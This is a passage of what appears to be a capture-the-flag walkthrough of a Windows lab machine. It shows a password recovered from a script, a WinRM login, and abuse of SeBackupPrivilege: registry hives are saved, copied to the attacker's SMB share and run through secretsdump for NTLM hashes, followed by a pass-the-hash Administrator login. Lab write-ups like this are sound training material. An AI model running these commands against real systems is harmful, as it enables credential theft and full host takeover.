+<span class="hljs-variable">$credentials</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>)
+<span class="hljs-variable">$dateStamp</span> = <span class="hljs-built_in">Get-Date</span> <span class="hljs-literal">-Format</span> <span class="hljs-string">"yyyyMMdd_HHmmss"</span>
+<span class="hljs-variable">$backupFileName</span> = <span class="hljs-string">"smb_backup_<span class="hljs-variable">$dateStamp</span>.zip"</span>
+<span class="hljs-variable">$backupFilePath</span> = <span class="hljs-built_in">Join-Path</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$destinationDirectory</span> <span class="hljs-literal">-ChildPath</span> <span class="hljs-variable">$backupFileName</span>
+<span class="hljs-built_in">Compress-Archive</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$sourceDirectory</span> <span class="hljs-literal">-DestinationPath</span> <span class="hljs-variable">$backupFilePath</span>
+<span class="hljs-built_in">Write-Host</span> <span class="hljs-string">"Backup completed successfully. Backup file saved to: <span class="hljs-variable">$backupFilePath</span>"</span></code></pre></div>
+<p>Another user and password, <code>emily.oscars</code> : <code>Q!3@Lp#M6b*7t*Vt</code>. This one finally can log in via WinRM, so we are in.</p>
+<p><code>evil-winrm -i 10.129.126.15 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'</code></p>
+<p><img src="/_resources/4f53abc52c354afeb85efab41cfd086c.png" /></p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>We can learn that user Emily has quite a few privs. We can abuse SeBackupPriv for escalation for sure.</p>
+<div><pre class="hljs"><code><span class="hljs-strong">*Evil-WinRM*</span> PS C:\Users\emily.oscars.CICADA\Desktop&gt; whoami /priv
+
+<span class="hljs-section">PRIVILEGES INFORMATION
+----------------------</span>
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</code></pre></div>
+<p>We can then create a smb share and connect to it from windows using <code>net use \\10.10.16.9\shared</code>. Go to <code>C:\Temp</code> and copy system info, then tranfer files to our shared folder back.</p>
+<div><pre class="hljs"><code>On windows:
+<span class="hljs-keyword">reg</span> save hklm\sam C:\temp\sam.hive
+<span class="hljs-keyword">reg</span> save hklm\<span class="hljs-built_in">system</span> C:\temp\<span class="hljs-built_in">system</span>.hive
+<span class="hljs-keyword">cp</span> C:\temp\* .\
+
+On linux:
+/usr/share/doc/<span class="hljs-keyword">python3</span>-impacket/examples/secretsdump.<span class="hljs-keyword">py</span> -sam sam.hive -<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.hive LOCAL</code></pre></div>
+<p>Then we get:</p>
+<div><pre class="hljs"><code>Impacket v<span class="hljs-number">0.11</span>.<span class="hljs-number">0</span> - Copyright <span class="hljs-number">2023</span> Fortra
+
+[*] Target system bootKey: <span class="hljs-number">0x3c2b033757a49110a9ee680b46e8d620</span>
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:<span class="hljs-number">500</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">2</span>b<span class="hljs-number">87e7</span><span class="hljs-keyword">c</span><span class="hljs-number">93</span>a<span class="hljs-number">3e8</span>a<span class="hljs-number">0</span>ea<span class="hljs-number">4</span>a<span class="hljs-number">581937016</span>f<span class="hljs-number">341</span>:::
+Guest:<span class="hljs-number">501</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>:::
+DefaultAccount:<span class="hljs-number">503</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Cleaning up... </code></pre></div>
+<p>By passing the hash, we are in!<br />
+<code>evil-winrm -i 10.129.126.15  -u "Administrator" -H  2b87e7c93a3e8a0ea4a581937016f341</code></p>
+<p><img src="/_resources/d9d959eb415a42b7bba6c7811a79272a.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
